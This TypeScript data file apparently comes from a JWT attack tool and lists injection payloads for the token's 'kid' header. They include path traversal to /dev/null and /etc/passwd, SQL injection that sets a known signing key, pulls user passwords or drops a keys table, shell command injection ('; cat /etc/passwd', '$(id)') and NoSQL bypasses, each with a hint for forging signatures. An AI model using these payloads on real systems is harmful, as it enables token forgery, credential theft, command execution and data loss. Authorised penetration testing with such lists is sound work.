import type { KidPayload } from '../types/crypto.types'

export const KID_PAYLOADS: KidPayload[] = [
  // Path Traversal
  {
    category: 'path-traversal',
    label: '/dev/null (empty key)',
    value: '../../dev/null',
    secretHint: 'Server reads /dev/null → empty string',
    secretValue: '',
  },
  {
    category: 'path-traversal',
    label: '/dev/null (deeper)',
    value: '../../../dev/null',
    secretHint: 'Server reads /dev/null → empty string',
    secretValue: '',
  },
  {
    category: 'path-traversal',
    label: '/dev/null (URL-encoded)',
    value: '..%2F..%2Fdev%2Fnull',
    secretHint: 'Server reads /dev/null → empty string',
    secretValue: '',
  },
  {
    category: 'path-traversal',
    label: '../../etc/passwd',
    value: '../../etc/passwd',
    secretHint: 'Unknown — depends on /etc/passwd content',
    secretValue: '',
  },

  // SQL Injection
  {
    category: 'sqli',
    label: "OR '1'='1 (tautology)",
    value: "' OR '1'='1",
    secretHint: "Unknown — returns first key in DB. You need to know what that is.",
    secretValue: '',
  },
  {
    category: 'sqli',
    label: 'UNION SELECT (controlled key)',
    value: "' UNION SELECT 'mysecret' --",
    secretHint: "The server will use 'mysecret' as the HMAC key",
    secretValue: 'mysecret',
  },
  {
    category: 'sqli',
    label: 'DROP TABLE keys',
    value: "'; DROP TABLE keys --",
    secretHint: 'Destructive — may drop the keys table before verification',
    secretValue: '',
  },
  {
    category: 'sqli',
    label: "Admin comment-out",
    value: "admin' --",
    secretHint: 'Unknown — returns admin key if it exists',
    secretValue: '',
  },
  {
    category: 'sqli',
    label: 'OR 1=1 variant',
    value: "' OR 1=1; --",
    secretHint: 'Unknown — returns first row',
    secretValue: '',
  },
  {
    category: 'sqli',
    label: 'UNION password extract',
    value: "123' AND 1=0 UNION SELECT password FROM users WHERE '1'='1",
    secretHint: 'Returns a password from users table',
    secretValue: '',
  },

  // Command Injection
  {
    category: 'command-injection',
    label: 'cat /etc/passwd',
    value: '; cat /etc/passwd',
    secretHint: 'Unknown — depends on command output',
    secretValue: '',
  },
  {
    category: 'command-injection',
    label: 'whoami',
    value: '| whoami',
    secretHint: 'Unknown — depends on command output',
    secretValue: '',
  },
  {
    category: 'command-injection',
    label: 'id command',
    value: '$(id)',
    secretHint: 'Unknown — depends on command output',
    secretValue: '',
  },

  // NoSQL Injection
  {
    category: 'nosql',
    label: '$gt (MongoDB bypass)',
    value: '{"$gt": ""}',
    secretHint: 'Unknown — bypasses NoSQL queries',
    secretValue: '',
  },
  {
    category: 'nosql',
    label: '$ne (not-equal bypass)',
    value: '{"$ne": null}',
    secretHint: 'Unknown — bypasses NoSQL queries',
    secretValue: '',
  },
]

export const KID_CATEGORIES = [
  { value: 'path-traversal', label: 'Path Traversal' },
  { value: 'sqli', label: 'SQL Injection' },
  { value: 'command-injection', label: 'Command Injection' },
  { value: 'nosql', label: 'NoSQL Injection' },
] as const

export type KidCategory = (typeof KID_CATEGORIES)[number]['value']
